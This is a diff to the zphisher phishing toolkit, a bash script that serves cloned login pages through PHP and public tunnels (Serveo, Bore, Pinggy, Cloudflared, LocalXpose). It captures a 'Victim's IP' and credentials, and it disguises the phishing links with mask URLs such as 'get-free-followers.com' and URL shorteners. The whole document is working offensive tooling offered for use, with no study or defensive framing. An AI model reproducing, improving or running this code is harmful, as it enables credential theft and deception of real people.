@@ -1,8 +1,179 @@
+
+## Start Bore
+## Start Bore Tunnel (Improved)
+start_bore() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
+	sleep 1
+	if ! curl -s http://127.0.0.1:$PORT > /dev/null 2>&1; then
+		echo -e " ${RED}FAILED${WHITE}"
+		killall php > /dev/null 2>&1
+		cd .server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+		sleep 2
+	else
+		echo -e " ${GREEN}OK${WHITE}"
+	fi
+
+	echo -e "\n${YELLOW}╔════════════════════════════════════════════╗${WHITE}"
+	echo -e "${YELLOW}║  ${WHITE}Bore Tunnel: ${GREEN}Free & Open Source${WHITE}        ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}No registration required${WHITE}              ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}Public server: bore.pub${WHITE}               ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}╚════════════════════════════════════════════╝${WHITE}\n"
+	sleep 1
+
+	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Bore tunnel..."
+	rm -f .server/.bore.log
+
+	if [[ `command -v termux-chroot` ]]; then
+		termux-chroot ./.server/bore local $PORT --to bore.pub > .server/.bore.log 2>&1 &
+	else
+		./.server/bore local $PORT --to bore.pub > .server/.bore.log 2>&1 &
+	fi
+
+	sleep 6
+	echo -e "${GREEN} Done!${WHITE}"
+
+	# Extract URL from log
+	bore_url=$(grep -o "bore\.pub:[0-9]*" .server/.bore.log 2>/dev/null | tail -1)
+	
+	if [ -n "$bore_url" ]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 1 : ${GREEN}http://$bore_url${WHITE}"
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 2 : ${GREEN}https://$bore_url${WHITE}"
+	else
+		# Check for errors in log
+		if grep -qi "could not connect\|timed out\|error" .server/.bore.log 2>/dev/null; then
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to start Bore${WHITE}"
+			echo -e "${YELLOW}Possible reasons: bore.pub down, port in use, no internet${WHITE}"
+			echo -e "${CYAN}Trying to reconnect in 5 seconds...${WHITE}"
+			sleep 5
+			# Retry once
+			./.server/bore local $PORT --to bore.pub > .server/.bore.log 2>&1 &
+			sleep 6
+			bore_url=$(grep -o "bore\.pub:[0-9]*" .server/.bore.log 2>/dev/null | tail -1)
+			if [ -n "$bore_url" ]; then
+				echo -e "\n${GREEN}[${WHITE}✓${GREEN}]${GREEN} Reconnected successfully!${WHITE}"
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 1 : ${GREEN}http://$bore_url${WHITE}"
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 2 : ${GREEN}https://$bore_url${WHITE}"
+			else
+				echo -e "\n${RED}[${WHITE}!${RED}]${RED} Bore service unavailable. Try another tunnel.${WHITE}"
+				exit 1
+			fi
+		else
+			echo -e "\n${YELLOW}[${WHITE}i${YELLOW}]${YELLOW} Bore tunnel running (URL not captured yet)${WHITE}"
+			echo -e "${CYAN}Check .server/.bore.log for details${WHITE}"
+		fi
+	fi
+
+	custom_url "bore.pub:${bore_url#*:}"
+}
+
+
+## Start Pinggy Tunnel
+start_pinggy() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
+	sleep 1
+	if ! curl -s http://127.0.0.1:$PORT > /dev/null 2>&1; then
+		echo -e " ${RED}FAILED${WHITE}"
+		killall php > /dev/null 2>&1
+		cd .server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+		sleep 2
+	else
+		echo -e " ${GREEN}OK${WHITE}"
+	fi
+
+	echo -e "\n${YELLOW}╔════════════════════════════════════════════╗${WHITE}"
+	echo -e "${YELLOW}║  ${WHITE}Pinggy Tunnel: ${GREEN}Free & Fast${WHITE}           ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}SSH-based (no install)${WHITE}               ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}60 minutes free per session${WHITE}         ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}╚════════════════════════════════════════════╝${WHITE}\n"
+	sleep 1
+
+	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Pinggy tunnel..."
+	rm -f .server/.pinggy.log
+
+	# Start Pinggy tunnel using SSH
+	ssh -i $HOME/.ssh/id_pinggy -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o PasswordAuthentication=no -p 443 -R0:localhost:$PORT a.pinggy.io > .server/.pinggy.log 2>&1 &
+	
+	sleep 8
+	echo -e "${GREEN} Done!${WHITE}"
+
+	# Extract URL from log
+	pinggy_url=$(grep -oE "https://[a-z0-9\-]+\.a\.pinggy\.(online|io|link)" .server/.pinggy.log | head -1)
+	
+	if [ -z "$pinggy_url" ]; then
+		# Alternative parsing
+		pinggy_url=$(grep -oE "http://[a-z0-9\-]+\.a\.pinggy\.(online|io)" .server/.pinggy.log | head -1)
+	fi
+	
+	if [ -n "$pinggy_url" ]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL : ${GREEN}$pinggy_url${WHITE}"
+		echo -e "\n${YELLOW}[${WHITE}i${YELLOW}]${YELLOW} Session limit: 60 minutes${WHITE}"
+	else
+		# Check for errors
+		if grep -qi "connection.*refused\|timed out\|error" .server/.pinggy.log 2>/dev/null; then
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to start Pinggy${WHITE}"
+			echo -e "${YELLOW}Possible reasons: SSH blocked, no internet, pinggy.io down${WHITE}"
+			exit 1
+		else
+			echo -e "\n${YELLOW}[${WHITE}i${YELLOW}]${YELLOW} Pinggy tunnel running${WHITE}"
+			echo -e "${CYAN}Fetching URL from log...${WHITE}"
+			sleep 2
+			# Parser para formato: xxx-xxx-xxx-xxx.a.free.pinggy.link
+			pinggy_url=$(grep -E "https?://[a-z0-9-]+.a.(free.)?pinggy.(link|online|io)" .server/.pinggy.log | head -1)
+			if [ -n "$pinggy_url" ]; then
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Pinggy URL : ${GREEN}$pinggy_url${WHITE}"
+				echo -e "${YELLOW}[${WHITE}i${YELLOW}]${YELLOW} Session: 60 minutes${WHITE}"
+			else
+				echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to parse URL${WHITE}"
+				echo -e "${CYAN}Manual check: cat .server/.pinggy.log | grep http${WHITE}"
+			fi
+			sleep 2
+			pinggy_url=$(grep -oE "https?://[a-zA-Z0-9\-]+.a.pinggy\.(online|io|link)" .server/.pinggy.log | head -1)
+			if [ -n "$pinggy_url" ]; then
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Pinggy URL : ${GREEN}$pinggy_url${WHITE}"
+			else
+				echo -e "${ORANGE}URL not found. Check: cat .server/.pinggy.log${WHITE}"
+			fi
+			echo -e "${CYAN}Check .server/.pinggy.log for URL${WHITE}"
+		fi
+	fi
+
+	# Extract URL one more time to ensure we have it
+	if [ -z "$pinggy_url" ]; then
+		pinggy_url=$(grep -E "https?://[a-z0-9-]+.a.(free.)?pinggy.(link|online|io)" .server/.pinggy.log | head -1)
+	fi
+	# Extract just the domain part for custom_url
+	pinggy_domain=${pinggy_url#http*://}
+	custom_url "$pinggy_domain"
+}
+
+
+## Install Bore
+install_bore() {
+    if [[ -e ".server/bore" ]]; then
+        echo -e "\n${success}Bore already installed."
+    else
+        echo -e "\n${info}Installing Bore..."
+        arch=$(uname -m)
+        if [[ "$arch" == *'arm'* || "$arch" == *'aarch64'* || "$arch" == *'android'* ]]; then
+            download 'https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-aarch64-unknown-linux-musl.tar.gz' 'bore'
+        else
+            download 'https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-unknown-linux-musl.tar.gz' 'bore'
+        fi
+    fi
+}
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.1
+##   Version 	: 	2.3.5
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
 
@@ -85,11 +256,16 @@
 ##   Ali Milani Amin - https://github.com/AliMilani
 ##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
 ##   Moises Tapia - https://github.com/MoisesTapia
+##   Mr.Derek - https://github.com/E343IO
 ##   Mustakim Ahmed - https://github.com/bdhackers009
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.1"
+__version__="2.3.5"
+
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='8080' 
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -99,6 +275,8 @@ MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(prin
 RESETBG="$(printf '\e[0m\n')"
 
 ## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
@@ -146,12 +324,56 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php ngrok cloudflared loclx"
+	check_PID="php cloudflared loclx ssh bore"
+	# Kill Pinggy SSH tunnel
+	pkill -f "ssh.*pinggy" > /dev/null 2>&1
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
 			killall ${process} > /dev/null 2>&1 # Kill the Process
 		fi
 	done
+
+	# Reset terminal
+	reset > /dev/null 2>&1 || stty sane 2>/dev/null
+}
+
+# Check for a newer release
+check_update(){
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+
+	if [[ $new_version != $__version__ ]]; then
+		echo -ne "${ORANGE}update found\n"${WHITE}
+		sleep 2
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		pushd "$HOME" > /dev/null 2>&1
+		curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+
+		if [[ -e ".zphisher.tar.gz" ]]; then
+			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+			rm -f .zphisher.tar.gz
+			popd > /dev/null 2>&1
+			{ sleep 3; clear; banner_small; }
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			{ reset_color ; exit 1; }
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			{ reset_color; exit 1; }
+		fi
+	else
+		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+	fi
+}
+
+## Check Internet Status
+check_status() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
@@ -243,6 +465,9 @@ download() {
 		elif [[ ${file#*.} == "tgz" ]]; then
 			tar -zxf $file > /dev/null 2>&1
 			mv -f $output .server/$output > /dev/null 2>&1
+		elif [[ "$file" == *.tar.gz ]]; then
+			tar -xzf $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
 		else
 			mv -f $file .server/$output > /dev/null 2>&1
 		fi
@@ -251,6 +476,44 @@ download() {
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
+	fi
+}
+
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+		else
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+		fi
+	fi
+}
+
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e ".server/loclx" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
 	fi
 }
 
@@ -277,7 +540,8 @@ about() {
 		
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
 		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, sepp0, ThelinuxChoice, Yisus7u7
+		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
+		  Yisus7u7
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -296,21 +560,47 @@ about() {
 	esac
 }
 
-## Setup website and start php server
-HOST='127.0.0.2'
-PORT='3000'
+## Choose custom port
+cusport() {
+	echo
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+		echo -e "\n"
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
+			PORT=${CU_P}
+			echo
+		else
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			{ sleep 2; clear; banner_small; cusport; }
+		fi		
+	else 
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+	fi
+}
 
+## Setup website and start php server
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	
+	# LIMPIAR TODO primero
+	echo -e "${YELLOW}[DEBUG] Cleaning .server/www/ first...${WHITE}"
+	rm -rf .server/www/*
+	
+	echo -e "${YELLOW}[DEBUG] Template selected: $website${WHITE}"
+	echo -e "${YELLOW}[DEBUG] Copying from: .sites/$website/${WHITE}"
+	ls -lh .sites/$website/ | head -3
+	
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
+	
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Get IP address
 capture_ip() {
-	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
@@ -348,34 +638,26 @@ capture_data() {
 	done
 }
 
-## Start ngrok
-start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; }
-	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
-
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
-	else
-		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
-	fi
-
-	{ sleep 8; clear; banner_small; }
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
-	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
-	capture_data
-}
-
 ## Start Cloudflared
 start_cloudflared() { 
-    rm .cld.log > /dev/null 2>&1 &
+	rm .cld.log > /dev/null 2>&1 &
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
+	
+	# Warning para Android
+	if [[ $(uname -o) == *'Android'* ]]; then
+		echo -e "\n${ORANGE}╔════════════════════════════════════════════╗${WHITE}"
+		echo -e "${ORANGE}║  ${RED}⚠️  WARNING: ANDROID DETECTED${WHITE}             ${ORANGE}║${WHITE}"
+		echo -e "${ORANGE}║  ${WHITE}Cloudflared often fails on Android due${WHITE}   ${ORANGE}║${WHITE}"
+		echo -e "${ORANGE}║  ${WHITE}to IPv6 DNS issues. Use Serveo instead.${WHITE}  ${ORANGE}║${WHITE}"
+		echo -e "${ORANGE}╚════════════════════════════════════════════╝${WHITE}\n"
+		read -p "${RED}[${WHITE}-${RED}]${YELLOW} Continue anyway? (y/N): ${WHITE}" cf_continue
+		if [[ ! "$cf_continue" =~ ^[Yy]$ ]]; then
+			tunnel_menu
+			return
+		fi
+	fi
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
@@ -384,13 +666,58 @@ start_cloudflared() {
 		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
-	{ sleep 8; clear; banner_small; }
+	sleep 15
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	custom_url "$cldflr_url"
+}
+
+
+
+## Start Serveo (SSH Tunnel - RECOMMENDED)
+start_serveo() {
+	cusport
+	echo -e "
+${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
 	
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
-	capture_data
+	echo -ne "
+${RED}[${WHITE}-${RED}]${BLUE} Verifying PHP server..."
+	sleep 1
+	if ! curl -s http://127.0.0.1:$PORT > /dev/null 2>&1; then
+		echo -e " ${RED}FAILED${WHITE}"
+		killall php > /dev/null 2>&1
+		cd .server/www && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
+		sleep 2
+	else
+		echo -e " ${GREEN}OK${WHITE}"
+	fi
+	
+	echo -ne "
+${RED}[${WHITE}-${RED}]${GREEN} Launching Serveo..."
+	rm -f .server/.serveo.log
+
+	if [[ `command -v termux-chroot` ]]; then
+		setsid termux-chroot ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$PORT serveo.net > .server/.serveo.log 2>&1 < /dev/null &
+	else
+		setsid ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$PORT serveo.net > .server/.serveo.log 2>&1 < /dev/null &
+	fi
+
+	sleep 12
+	serveo_url=$(grep -oE 'https://[a-z0-9]+\.serveo\.net' ".server/.serveo.log" | head -1)
+	
+	if [[ -z "$serveo_url" ]]; then
+		echo -e "
+
+${RED}[${WHITE}!${RED}]${RED} Serveo is temporarily unavailable."
+		echo -e "${ORANGE}[${WHITE}*${ORANGE}] Try LocalXpose (option 03) or wait and retry."
+		cat .server/.serveo.log | tail -5
+		sleep 3
+		tunnel_menu
+	else
+		echo -e "
+${GREEN}[${WHITE}✓${GREEN}]${CYAN} Tunnel established successfully!"
+		custom_url "$serveo_url"
+	fi
 }
 
 localxpose_auth() {
@@ -412,10 +739,19 @@ localxpose_auth() {
 
 ## Start LocalXpose (Again...)
 start_loclx() {
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
+	
+	# Warning de límite de 15 minutos
+	echo -e "\n${YELLOW}╔════════════════════════════════════════════╗${WHITE}"
+	echo -e "${YELLOW}║  ${WHITE}LocalXpose Free Tier: ${RED}15 MINUTES LIMIT${WHITE}  ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}After 15min, tunnel will disconnect${WHITE}     ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}Upgrade at: ${WHITE}https://localxpose.io${WHITE}      ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}╚════════════════════════════════════════════╝${WHITE}\n"
+	sleep 2
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -425,31 +761,41 @@ start_loclx() {
 		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	fi
 
-	{ sleep 12; clear; banner_small; }
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
-	capture_data
+	sleep 12
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+	custom_url "$loclx_url"
 }
 
 ## Start localhost
 start_localhost() {
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-	capture_data
+}
+
+## Check Serveo status
+check_serveo() {
+	if timeout 3 bash -c "echo > /dev/tcp/serveo.net/22" 2>/dev/null; then
+		SERVEO_STATUS="${GREEN}ONLINE${WHITE}"
+	else
+		SERVEO_STATUS="${RED}DOWN${WHITE}"
+	fi
 }
 
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
+	check_serveo
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Account Needed${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost      ${RED}[${CYAN}Local network only${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Serveo         ${RED}[${WHITE}Status: ${SERVEO_STATUS}${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose     ${RED}[${CYAN}Free: 15min limit${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} Cloudflared    [${ORANGE}May fail on Android${RED}]
+		${RED}[${WHITE}05${RED}]${ORANGE} Bore           ${RED}[${GREEN}NEW - Free & Fast${RED}]
+		${RED}[${WHITE}06${RED}]${ORANGE} Pinggy         ${RED}[${CYAN}60min free - SSH-based${RED}]
 
 	EOF
 
@@ -459,15 +805,87 @@ tunnel_menu() {
 		1 | 01)
 			start_localhost;;
 		2 | 02)
-			start_ngrok;;
+			if [[ "$SERVEO_STATUS" == *"DOWN"* ]]; then
+				echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Serveo is temporarily down. Try LocalXpose (option 03)."
+				sleep 3
+				tunnel_menu
+			else
+				start_serveo
+			fi
+			;;
 		3 | 03)
-			start_cloudflared;;
-		4 | 04)
 			start_loclx;;
+		4 | 04)
+			start_cloudflared;;
+		5 | 05)
+			start_bore;;
+		6 | 06)
+			start_pinggy;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "
+${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
+}
+## 
+## Custom Mask URL
+custom_mask() {
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+		fi
+	fi
+}
+
+## URL Shortner
+site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+
+shorten() {
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	if [[ "$1" == *"shrtco.de"* ]]; then
+		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	else
+		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
+		processed_url=${short#http*//}
+	fi
+}
+
+custom_url() {
+	url=${1#http*//}
+	isgd="https://is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
+
+	{ custom_mask; sleep 1; clear; banner_small; }
